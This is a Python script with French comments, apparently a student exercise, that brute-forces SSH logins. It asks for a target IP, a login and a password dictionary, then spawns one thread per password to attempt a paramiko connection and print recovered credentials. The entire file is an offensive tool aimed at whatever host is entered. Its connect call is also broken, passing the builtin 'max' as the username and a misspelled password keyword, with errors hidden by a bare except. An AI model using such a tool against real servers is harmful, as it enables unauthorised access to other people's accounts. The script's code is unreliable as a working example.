#
# NOM ET PRENOM: Maxime Morisson
#

# On importe les modules nécessaires pour l'éxecution du script.

import paramiko
import sys
import os 
import socket
import threading
import time


# Message de Bienvenue.

print("                                                                         ")
print("### ~                                                              ~  ###")
print("### ~ Bienvenue sur le script de bruteforce pour une connexion SSH ~  ###") 
print("### ~                                                              ~  ###")
print("                                                                         ")

stop_flag=0

#------------------------------------------------------------------------------------------------#
#-------------------------------------- CONNEXION SSH -------------------------------------------#
#------------------------------------------------------------------------------------------------#

def ssh_connect(passwrd, code=0):
    global stop_flag

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Tentative de connexions avec les specs précisés dans le code.
    try:
        ssh.connect(host,port=22, username=max, passwrd=passwrd, timeout= 200)
        stop_flag = 1

        # Affichage de différents messages en fonction de la situation.
        print('### Reussi !! Credentials recupere: ' + login + ' avec le mot de passe: ' + passwrd)
    except:
        print('### Erreur !! le login ne correspond pas | Mot de passe incorrect: ' + passwrd)
    
    # On termine le connexion SSH
    ssh.close()
    

#------------------------------------------------------------------------------------------------#
#------------------------------------- INFORMATIONS ---------------------------------------------#
#------------------------------------------------------------------------------------------------#


# On commence par demander l'adresse cible à l'utilisateur.

# ADRESSE IP:
host = input("Adresse IP de la cible: ")

# Login:
login = input('Entrer le login SSH: ')

# Demande du dictionnaire de passwords:
input_file = input('Entrer le dictionnaire de mots de passes que vous voulez utiliser: ')
print('\n')

# Dans le cas où le fichier n'existe pas.
if os.path.exists(input_file) == False:
    print('[!] Aucun dictionnaire de ce nom ne correspond !')
    sys.exit(1)

#------------------------------------------------------------------------------------------------#
#-------------------------------------- BRUTEFORCE ----------------------------------------------#
#------------------------------------------------------------------------------------------------#

# Affichage d'un message pour le user pour le début du bruteforce.
print('# # # Demarrage du bruteforce SSH sur ' + host + ' avec le compte: ' + login + ' # # #\n')

# Lecture des  lignes entrées dans le dictionnaire de mdps.
with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()



        passwrd = line.strip()
        t=threading.Thread(target=ssh_connect, args=(passwrd,)) 
        t.start()
        time.sleep(0.01)

    # Message de fin 
    print('                 ')
    print('Fin de la tâche !')
    print('                 ')